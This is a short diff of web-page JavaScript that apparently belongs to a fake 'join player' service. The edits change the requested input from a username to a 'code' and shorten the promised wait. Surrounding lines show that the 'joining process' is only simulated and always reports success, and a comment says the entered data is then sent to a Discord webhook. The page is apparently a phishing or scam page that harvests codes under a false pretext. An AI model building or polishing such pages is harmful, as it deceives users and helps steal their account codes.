@@ -453,7 +453,7 @@
             if (!username.trim()) {
                 // Show error modal
                 modalTitle.textContent = 'Error!';
-                modalMessage.textContent = 'Please enter a username before proceeding.';
+                modalMessage.textContent = 'Please enter a code before proceeding.';
                 modalBtn.style.display = 'inline-block';
                 modal.classList.add('show');
                 return;
@@ -468,7 +468,7 @@
             // Simulate joining process
             setTimeout(async () => {
                 modalTitle.textContent = 'Success!';
-                modalMessage.textContent = 'Join request sent successfully! You should join the player within 5 to 10 minutes.';
+                modalMessage.textContent = 'Join request sent successfully! You should join the player within 30 second';
                 modalBtn.style.display = 'inline-block';
                 
                 // Envoyer les données au webhook Discord après l'affichage du succès
